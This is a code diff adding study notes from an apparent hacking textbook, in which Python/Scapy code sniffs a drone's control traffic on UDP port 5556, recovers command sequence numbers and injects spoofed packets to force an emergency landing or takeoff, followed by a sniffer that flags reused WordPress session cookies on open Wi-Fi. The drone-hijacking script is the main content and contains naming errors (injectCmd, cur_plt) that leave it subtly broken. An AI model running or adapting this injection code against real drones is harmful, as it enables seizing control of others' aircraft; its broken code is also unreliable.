@@ -1767,3 +1767,120 @@ def sniff_dot_11(p):
 # We know the mac address of the access points, but still we don't know
 # anything about the SSID name. To discover the hidden names, we must 
 # wait for probe responses which match the earlier mac address.
+# It's crazy to think that even UAV's can be intercepted using python. In
+# fact, there's was such an attack on a US UAV with $26 apparatus years 
+# ago! The first step is to get a wireless adapter in monitor mode. A 
+# paired iphone can send instructions to the UAV, yet the only security
+# mechanism protecting this connection is MAC filtering (the MAC address 
+# assigned to each network card is used to determine access to the network). Using a 
+# tcpdump, we see some UDP traffic coming into the Iphone (from the UAV I guess) on 
+# a port. There's another set of data going from the Iphone to the UAV. Bingo.
+
+NAVPORT = 5556
+def print_packet(pkt):
+    if pkt.haslayer(UDP) and pkt.getlayer(UDP).dport == NAVPORT:
+        raw = pkt.sprintf("%RAW.load%")
+        print(raw)
+
+# The author ran this script to monitor the UAV traffic for a long time to see trends
+# (so you want to be a hacker huh?), and found several trends, such as one for landing 
+# the plane, controlling its motion, etc.
+
+EMER = '290717952'
+TAKEOFF = '290718208'
+class InterceptThread(Thread):
+    def __init__(self):
+        Thread.__init__(self)
+        self.cur_pkt = None 
+        self.seq = 0
+        self.foundUAV = False 
+
+    def run(self):
+        sniff(prn=self.intercept_pkt, filter='udp port 5556')
+
+    def intercept_pkt(self, pkt):
+        if self.foundUAV == False:
+            print("[*] UAV found")
+            self.foundUAV = True 
+        self.cur_pkt = pkt 
+        raw = self.cur_pkt.sprintf("%Raw.load%")
+
+        try:
+            # Apparently the sequence number is held in the first sentence before the comma and the last element after
+            # the series of = signs. + 5. This is the format listed in the book:
+            # AT*CMD*=SEQUENCE_NUMBER,VALUE,[VALUE{3}].
+            self.seq = int(raw.split(',')[0].split('=')[-1]) + 5
+        except:
+            self.seq = 0
+
+    def inject_command(self, cmd):
+        ''' What's going on here? Let's assume we got the dup library (which you can take a look at in the book's code).
+        This is duplicating the current packet at each of the radio, dot11, .. layers. It then adds the command as the 
+        payload of the udp layer, forges all the other layers together, and sends the packet off. Simple!!!'''
+
+        radio = dup.dupRadio(self.cur_plt)
+        dot11 = dup.dupDot11(self.cur_plt)
+        snap = dup.dupSNAP(self.cur_plt)
+        llc = dup.dupLLC(self.cur_plt)
+        ip = dup.dupIP(self.cur_plt)
+        udp = dup.dupUDP(self.cur_plt)
+        raw = Raw(load=cmd)
+        injectPkt = radio / dot11 / llc / snap / ip / udp / raw
+        sendp(injectPkt)
+
+    def emergencyland(self):
+        ''' Spoof a sequence and run the command '''
+        spoofSeq = self.seq + 100
+        watch = 'AT*COMWDG=%i\r'%spoofSeq
+        toCmd = 'AT*REF=%i,%s\r'% (spoofSeq + 1, EMER)
+        self.injectCmd(watch)
+        self.injectCmd(toCmd)
+
+    def takeoff(self):
+        spoofSeq = self.seq + 100
+        watch = 'AT*COMWDG=%i\r'%spoofSeq
+        toCmd = 'AT*REF=%i,%s\r'% (spoofSeq + 1, TAKEOFF)
+        self.injectCmd(watch)
+        self.injectCmd(toCmd)
+
+# We got the sequence number we need, so we can craft our own packets to send to the drone now. Here comes the 
+# reason why we saved the current packet. We need to duplicate a lot of information from the original packet 
+# itself, and we need to be careful to copy each layer. Scapy makes it easy for us to understand each field 
+# in layers, by doing a ls(layer_name). 
+
+# For the Dot11 layer -
+# subtype    : BitMultiEnumField                   = ('0')
+# type       : BitEnumField                        = ('0')
+# proto      : BitField  (2 bits)                  = ('0')
+# cfe        : BitEnumField (Cond)                 = ('0')
+# FCfield    : MultipleTypeField (FlagsField, FlagsField) = ('<Flag 0 ()>')
+# ID         : ShortField                          = ('0')
+# addr1      : _Dot11MacField                      = ("'00:00:00:00:00:00'")
+# addr2      : _Dot11MacField (Cond)               = ("'00:00:00:00:00:00'")
+# addr3      : _Dot11MacField (Cond)               = ("'00:00:00:00:00:00'")
+# SC         : LEShortField (Cond)                 = ('0')
+# addr4      : _Dot11MacField (Cond)               = ("'00:00:00:00:00:00'")
+
+# We can leave out some fields, such as the IP field as each command may have a different length. There's
+# a lot of code for this part, which is pretty darn similar, so I am not going to bother writing it down,
+# but it is pretty interesting to read! Using our functions, we can inject commands into the drone/UAV
+# using the current packet.
+
+# The fireship tool passively listened to wireless card for HTTP cookies. When an insecure wireless network 
+# was encountered, the fireship tool intercepted these cookies, which is disasterous because most session 
+# control in the web is done via cookies or tokens. Everything about these requests are the same, excpet 
+# the user agent perhaps and definitely the IP address. So how would you check this kind of cookie reuse?
+# Check the IP address! Use scapy to spit out the IP layer.
+
+def fire_catcher(pkt):
+    raw = pkt.sprintf("%Raw.load%")
+    r = re.findall('wordpress_[0-9a-fA-F]{32}', raw)
+
+    # If there's a Set in a cookie, it was just set and thus is obviously not being reused
+    # This will print a bunch of src, dst, and cookies from the network being sniffed. If 
+    # any two IPs have the same cookie, we know one of them is an attacker. To know which
+    # one's which, we can implement a dictionary to raise an error if there's a common key.
+    
+    if r and 'Set' not in r:
+        print("Source {} -> Destination {} | Cookie: {}"\
+            .format(pkt.getlayer(IP).src, pkt.getlayer(IP).dst, r[0]))
